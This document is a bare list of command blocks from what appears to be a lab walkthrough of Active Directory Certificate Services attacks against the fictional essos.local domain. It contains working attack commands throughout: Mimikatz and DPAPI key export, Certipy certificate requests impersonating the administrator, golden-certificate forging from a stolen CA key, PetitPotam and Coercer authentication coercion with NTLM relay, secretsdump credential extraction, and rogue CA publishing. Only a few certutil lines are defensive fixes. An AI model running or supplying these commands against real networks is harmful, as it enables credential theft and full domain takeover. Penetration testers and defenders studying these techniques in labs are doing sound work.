["```\nmimikatz.exe \"crypto::certificates /export\" \"crypto::capi\" \"crypto::certificates /export\"  \"exit\"\n```", "```\ncrypto::system /file:C:\\users\\khal.drogo\\appdata\\roaming\\microsoft\\systemcertificates\\my\\certificates\\C7889A4CBF0B4F10CA29347D81327DC6CED9ED95 /export\ndpapi::capi /in:C:\\Users\\khal.drogo\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-2801885930-3847104905-347266793-1112\\d2d039eb9fe8cf2dd19f701b6f890220_9d1ba1ca-81ea-41ad-bc71-414af8de5013\ndpapi::masterkey /in:C:\\Users\\khal.drogo\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2801885930-3847104905-347266793-1112\\6e1524df-7d72-4b90-a95f-72341d79449f /rpc\ndpapi::capi /in:C:\\Users\\khal.drogo\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-2801885930-3847104905-347266793-1112\\d2d039eb9fe8cf2dd19f701b6f890220_9d1ba1ca-81ea-41ad-bc71-414af8de5013 /masterkey:5401985c1aa5a8ae1f25a9f08beaa53f4b6ad98e\n```", "```\nopenssl x509 -inform DER -outform PEM -in C7889A4CBF0B4F10CA29347D81327DC6CED9ED95.der -out public.pem\nopenssl rsa -inform PVK -outform PEM -in dpapi_exchange_capi_0_te-User-d700e753-1b10-45c7-aa92-b8a8ffe7493d.keyx.rsa.pvk -out private.pem\nopenssl pkcs12 -in public.pem -inkey private.pem -password pass:12345 -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out drogo_cert.pfx\n```", "```\nSharpDPAPI.exe certificates /machine\n```", "```\ncertutil -dump -v drogo_cert.pfx\n```", "```\nRubeus.exe asktgt /getcredentials /user:khal.drogo /certificate:drogo_cert.pfx /password:12345 /domain:essos.local /show\n```", "```\nCertify.exe find /clientauth\n```", "```\nCertify.exe request /ca:braavos.essos.local\\essos-ca /template:User\n```", "```\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -legacy -out viserys_cert.pfx\n```", "```\nCertify.exe request /ca:braavos.essos.local\\essos-ca /template:Machine /machine\n```", "```\nWhisker.exe add /target:viserys.targaryen /domain:essos.local\n```", "```\nStandIn.exe –computer legitpc –make\nSet-ADComputer legitpc -ServicePrincipalName @{}\nSet-ADComputer legitpc -DnsHostName meereen.essos.local\nGet-ADComputer legitpc -properties dnshostname,serviceprincipalnames\n```", "```\ncertipy-ad req -u 'legitpc$@essos.local' -p 'xfdb8UeqqgT9Aje' -target 192.168.56.23 -ca ESSOS-CA -template Machine -dc-ip 192.168.56.12\ncertipy-ad auth -pfx meereen.pfx -dc-ip 192.168.56.12\n```", "```\nGet-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentenrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=essos,DC=local'\n```", "```\ncertipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -vulnerable -stdout\ncertipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC1 -upn 'administrator@essos.local'\ncertipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12\n```", "```\nGet-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=essos,DC=local'\n```", "```\ncertipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC2\ncertipy-ad auth -pfx khal.drogo.pfx -dc-ip 192.168.56.12\n```", "```\nGet-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.1)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=essos,DC=local'\n```", "```\nGet-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=1)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=essos,DC=local'\n```", "```\ncertipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC3-CRA\ncertipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC3 -on-behalf-of 'essos\\administrator' -pfx khal.drogo.pfx\ncertipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12\n```", "```\n    certutil -dstemplate ESC9 msPKI-Enrollment-Flag +0x00080000\n    certutil -dstemplate ESC9 msPKI-Enrollment-Flag\n    reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Kdc /v StrongCertificateBindingEnforcement\n    ```", "```\n    certipy shadow auto -u 'khal.drogo@essos.local' -p 'horse' -account viserys.targaryen\n    ```", "```\n    certipy account update -username 'khal.drogo@essos.local' -p 'horse' -user viserys.targaryen -upn Administrator\n    ```", "```\n    certipy req -username 'viserys.targaryen@essos.local' -hashes 'd96a55df6bef5e0b4d6d956088036097' -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC9\n    ```", "```\n    certipy account update -username 'khal.drogo@essos.local' -p 'horse' -user viserys.targaryen -upn viserys.targaryen@essos.local\n    ```", "```\n    certipy auth -pfx 'administrator.pfx' -domain 'essos.local'\n    ```", "```\ncertutil -dstemplate ESC9 msPKI-Enrollment-Flag -0x00080000\n```", "```\n    reg query HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\Schannel /v CertificateMappingMethods\n    ```", "```\n    certipy shadow auto -u 'khal.drogo@essos.local' -p 'horse' -account viserys.targaryen\n    ```", "```\n    certipy account update -username 'khal.drogo@essos.local' -p 'horse' -user viserys.targaryen -upn 'Administrator@essos.local'\n    ```", "```\n    certipy req -username 'viserys.targaryen@essos.local' -hash 'd96a55df6bef5e0b4d6d956088036097' -target 192.168.56.23 -ca 'ESSOS-CA' -template User\n    ```", "```\n    certipy account update -username 'khal.drogo@essos.local' -p 'horse' -user viserys.targaryen -upn viserys.targaryen@essos.local\n    ```", "```\n    certipy auth -pfx 'administrator.pfx' -domain 'essos.local' -dc-ip 192.168.56.12 -ldap-shell\n    ```", "```\ncertipy-ad find -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -vulnerable -stdout\n```", "```\npython3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -raw\npython3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -get-acl\n```", "```\n    python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -value 0 -property mspki-enrollment-flag\n    ```", "```\n    python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -value 0 -property mspki-ra-signature\n    ```", "```\n    python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag\n    ```", "```\n    python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -property pkiExtendedKeyUsage -add \"Client Authentication\"\n    ```", "```\n    python3 modifyCertTemplate.py essos.local/khal.drogo:horse -template esc4 -dc-ip 192.168.56.12 -value \"'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'\" -property mspki-certificate-application-policy\n    ```", "```\ncertipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC4 -ca 'ESSOS-CA' -upn administrator@essos.local\ncertipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12\n```", "```\ncertipy-ad ca -backup -u viserys.targaryen -p GoldCrown -ca ESSOS-CA -target 192.168.56.23\n```", "```\nCertipy-ad forge -ca-pfx ESSOS-CA.pfx -upn Administrator@essos.local -subject 'CN=Administrator,CN=Users,DC=essos,DC=local' -template khal.drogo.pfx\ncertipy-ad auth -pfx administrator_forged.pfx -dc-ip 192.168.56.12\n```", "```\ncertsync -u viserys.targaryen -p GoldCrown -d essos.local -dc-ip 192.168.56.12 -ns 192.168.56.12\n```", "```\ncertipy-ad ca -u khal.drogo@essos.local -p horse -ca 'ESSOS-CA' -target braavos.essos.local -add-officer khal.drogo\ncertipy-ad ca -u khal.drogo@essos.local -p horse -ca 'ESSOS-CA' -target braavos.essos.local -enable-template SubCA\n```", "```\ncertipy-ad req -u khal.drogo@essos.local -p horse -ca ESSOS-CA -target braavos.essos.local -template SubCA -upn administrator@essos.local\ncertipy-ad ca -u khal.drogo@essos.local -p horse -ca ESSOS-CA -target braavos.essos.local -issue-request 19\ncertipy-ad req -u khal.drogo@essos.local -p horse -ca ESSOS-CA -target braavos.essos.local -retrieve 19\ncertipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12\n```", "```\ncertutil -config \"braavos\\ESSOS-CA\" -getreg \"policy\\EditFlags\"\n```", "```\ncertipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca 'ESSOS-CA' -upn administrator@essos.local\ncertipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12\n```", "```\ncertutil -config \"CA_HOST\\CA_NAME\" -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2\n```", "```\n    impacket-ntlmrelayx -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n    ```", "```\n    python3 PetitPotam.py 192.168.56.100 meereen.essos.local\n    ```", "```\n    python3 gettgtpkinit.py -pfx-base64 $(cat /home/kali/cert.b64) -dc-ip 192.168.56.12 'essos.local/meereen$' 'meereen.ccache'\n    ```", "```\n    export KRB5CCNAME=meereen.ccache\n    impacket-secretsdump -k -no-pass -just-dc-user daenerys.targaryen ESSOS.LOCAL/'meereen$'@meereen.essos.local\n    ```", "```\ncertipy-ad relay -ca 192.168.56.23 -template DomainController\ncertipy-ad auth -pfx meereen.pfx -dc-ip 192.168.56.12\n```", "```\ncertutil -setreg CA\\InterfaceFlags -IF_ENFORCEENCRYPTICERTREQUEST\nnet stop certsvc & net start certsvc\n```", "```\n    certipy find -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -stdout\n    ```", "```\n    certipy relay -target 'rpc://braavos.essos.local' -ca 'ESSOS-CA' -template DomainController\n    ```", "```\n    python3 Coercer.py coerce -u 'khal.drogo' -p 'horse' --target-ip 192.168.56.12 --listener-ip 192.168.56.100\n    ```", "```\n    certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12\n    ```", "```\ncertutil.exe -dspublish -f C:\\Users\\Public\\RogueCA.crt NTAuthCA\n```"]